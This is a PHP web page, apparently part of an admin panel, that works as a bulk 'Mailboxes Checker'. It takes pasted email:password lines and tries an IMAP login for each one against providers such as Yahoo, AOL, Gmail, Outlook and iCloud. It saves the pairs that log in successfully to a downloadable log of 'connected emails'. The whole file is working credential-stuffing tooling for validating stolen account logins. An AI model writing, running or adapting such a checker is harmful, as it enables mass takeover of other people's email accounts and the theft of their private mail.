<?php session_start();
if (!isset($_SESSION['name'])) {
    header("location:../login.php");
} else {
    $sessionname = $_SESSION['name'];
}
error_reporting(0);
?>
<html>
<head>
    <title>Cap Value Consulting</title>
    <?php include("../includes/inc.php"); ?>
</head>

<body>

<?php
include("../navbar-all.php");
?>
<div class="row">
    <div class="col-md-2">
        <?php include("../sidebar.php"); ?>
    </div>
    <div class="col-md-10">
        <div class="row">
            <div class="col-md-4"></div>
            <div class="col-md-4">
                <center><h1 class="title">Mailboxes Checker</h1></center>
                <br><br>
                <?php
                $id = $_GET['id'];
                $start = microtime(true);
                if ((!isset($_POST['data']) || $_POST['data'] == null)) {
                    echo '<center><div class="alert alert-danger" role="alert">No IP found</div></center>';
                } else {
                    cmpt('log/checkop.txt');
                    $data = $_POST['data'];
                    $data = explode("\n", str_replace("\r", "", $data));
                    $nbdata = count($data);
                    echo '<center><h4>Check of ' . $nbdata . ' mailboxes</h4><br>';
                    echo '</div>';
                    echo '<div class="col-md-4"></div>';
                    echo '</div>';
                    echo '<div class="row">';
                    foreach ($data as $dt) {
                        echo '<div class="col-md-4">';

                        if (strstr($dt, 'yahoo.com') || strstr($dt, 'sbcglobal') || strstr($dt, 'btinternet') || strstr($dt, 'Prodigy') || strstr($dt, 'swbell') || strstr($dt, 'btinternet')) {
                            $mailboxPath = '{imap.mail.yahoo.com:993/imap/ssl}';
                        } elseif (strstr($dt, 'yahoo.co.uk')) {
                            $mailboxPath = '{imap.mail.yahoo.co.uk:993/imap/ssl}';
                        } elseif (strstr($dt, 'aol') || strstr($dt, 'love.com') || strstr($dt, 'games.com')) {
                            $mailboxPath = '{imap.aol.com:993/imap/ssl}';
                        } elseif (strstr($dt, 'comcast')) {
                            $mailboxPath = '{mail.comcast.net:995/imap/ssl}';
                        } elseif (strstr($dt, 'att')) {
                            $mailboxPath = '{imap.att.yahoo.com:993/imap/ssl}';
                        } elseif (strstr($dt, 'gmx')) {
                            $mailboxPath = '{imap.gmx.com:993/imap/ssl}';
                        } elseif (strstr($dt, 'verizon')) {
                            $mailboxPath = '{incoming.verizon.net/imap/ssl}';
                        } elseif (strstr($dt, 'rr') || strstr($dt, 'roadrunner')) {
                            $mailboxPath = '{imap.rr.com/imap/ssl}';
                        } elseif (strstr($dt, 'sky')) {
                            $mailboxPath = '{imap.tools.sky.com:993/imap/ssl}';
                        } elseif (strstr($dt, 'centurylink')) {
                            $mailboxPath = '{mail.centurylink.net:993/imap/ssl}';
                        } elseif (strstr($dt, 'hotmail') || strstr($dt, 'outlook') || strstr($dt, 'live')) {
                            $mailboxPath = '{imap-mail.outlook.com:993/imap/ssl}';
                        } elseif (strstr($dt, 'gmail') || strstr($dt, 'googlemail')) {
                            $mailboxPath = '{imap.gmail.com:993/imap/ssl}';
                        } elseif (strstr($dt, 'earthlink')) {
                            $mailboxPath = '{imap.earthlink.net/imap/ssl}';
                        } elseif (strstr($dt, 'icloud')) {
                            $mailboxPath = '{mail.me.com:143/imap/ssl}';
                        } elseif (strstr($dt, 'mail')) {
                            $mailboxPath = '{imap.mail.com:993/imap/ssl}';
                        }

                        $cols = preg_split('/\s+|,/', $dt);
                        $username = $cols[0];
                        $password = $cols[1];
                        $imap = @imap_open($mailboxPath, $username, $password, null, 1);
                        $error = imap_errors();
                        if ($error == false) {
                            echo '<div class="alert alert-success" role="alert"><center><b>' . $username . ':</b> OK</center></div>';
                            $of = 'log/connected_emails__' . $id . '.txt';
                            $log = $dt . PHP_EOL;
                            file_put_contents($of, $log, FILE_APPEND);
                        } else {
                            echo '<div class="alert alert-danger alert-block" role="alert"><b>' . $username . ':</b> ' . $error[0] . '</div>';
                        }
                        echo '</div>';
                        cmpt('log/checkitems.txt');
                        @imap_close($imap);
                    }
                    echo '</div>';
                    echo '</div>';
                    echo '</div>';
                    echo '</div>';
                    echo '<div class="col-md-2 col-md-offset-6">';
                    echo '<a href="log/download.php?id=' . $id . '" class="btn btn-primary btn-sm btn-block" role="button">Download Connected emails <span class="glyphicon glyphicon-download-alt"></span>   </a>';
                    echo '</div>';
                }
                $end = microtime(true);
                $time = number_format(($end - $start), 2);
                echo $time . ' seconds<br>';

                function cmpt($file)
                {
                    $file = fopen($file, 'r+');
                    $v = fgets($file);
                    $v += 1;
                    fseek($file, 0);
                    fputs($file, $v);
                    fclose($file);
                }

                ?>
            </div>
</body>
</html>